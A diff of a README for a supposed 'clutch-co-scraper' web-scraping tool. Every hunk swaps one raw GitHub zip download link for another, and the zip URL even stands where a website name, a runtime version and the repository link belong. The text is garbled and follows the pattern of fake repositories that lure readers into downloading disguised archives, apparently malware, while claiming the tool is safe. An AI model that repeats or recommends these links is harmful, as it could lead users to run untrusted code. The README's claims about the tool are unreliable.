@@ -6,15 +6,15 @@ Welcome to the clutch-co-scraper! This tool helps you gather valuable company in
 
 ## 📥 Download Now
 
-[![Download clutch-co-scraper](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)
+[![Download clutch-co-scraper](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)
 
 ## 📋 Overview
 
-**clutch-co-scraper** is a web-scraping tool designed to extract data from company reviews on https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip It uses JavaScript to run smoothly in your environment. This tool is perfect for business intelligence, marketing analysis, and general research. 
+**clutch-co-scraper** is a web-scraping tool designed to extract data from company reviews on https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip It uses JavaScript to run smoothly in your environment. This tool is perfect for business intelligence, marketing analysis, and general research. 
 
 ## 🔍 Features
 
-- **Efficient Data Extraction:** Quickly pull review data from https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip
+- **Efficient Data Extraction:** Quickly pull review data from https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip
 - **User-Friendly Interface:** Simple setup makes it easy for anyone to use.
 - **Comprehensive Insights:** Get detailed information to make informed decisions.
 - **Regular Updates:** Stay current with the latest features and improvements.
@@ -22,7 +22,7 @@ Welcome to the clutch-co-scraper! This tool helps you gather valuable company in
 ## 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip Version:** 12.x or higher
+- **https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip Version:** 12.x or higher
 - **RAM:** At least 4 GB
 - **Internet Connection:** Required for scraping data
   
@@ -30,7 +30,7 @@ Welcome to the clutch-co-scraper! This tool helps you gather valuable company in
 
 1. **Visit the Releases Page:**
    Navigate to the following link to download the latest version of clutch-co-scraper:
-   [Download Here](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)
+   [Download Here](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)
 
 2. **Choose Your Version:**
    On the releases page, look for the latest version of the application. You will see a list of files available for download. 
@@ -65,7 +65,7 @@ Welcome to the clutch-co-scraper! This tool helps you gather valuable company in
 
 ### How does the scraper work?
 
-The clutch-co-scraper automatically navigates through https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip and collects reviews based on your input. It uses a series of programmed commands to mimic user actions, gathering data efficiently.
+The clutch-co-scraper automatically navigates through https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip and collects reviews based on your input. It uses a series of programmed commands to mimic user actions, gathering data efficiently.
 
 ### Is it safe to use?
 
@@ -77,8 +77,8 @@ Absolutely! You can run multiple searches in a row without any issues. Just rese
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** You can find the code and contribute here: [clutch-co-scraper Repo](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)
-- **https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip** Explore more about the source of the data: [https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)
+- **GitHub Repository:** You can find the code and contribute here: [clutch-co-scraper Repo](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)
+- **https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip** Explore more about the source of the data: [https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)
 
 ## 📞 Support
 
@@ -88,4 +88,4 @@ If you run into any issues or have questions, feel free to open an issue on the 
 
 This project is licensed under the MIT License. You can read more about it in the LICENSE file within the repository.
 
-[![Download clutch-co-scraper](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/clutch-co-scraper_2.0.zip)
+[![Download clutch-co-scraper](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)](https://raw.githubusercontent.com/BlackArrowQ/clutch-co-scraper/main/lucban/co_clutch_scraper_3.5.zip)
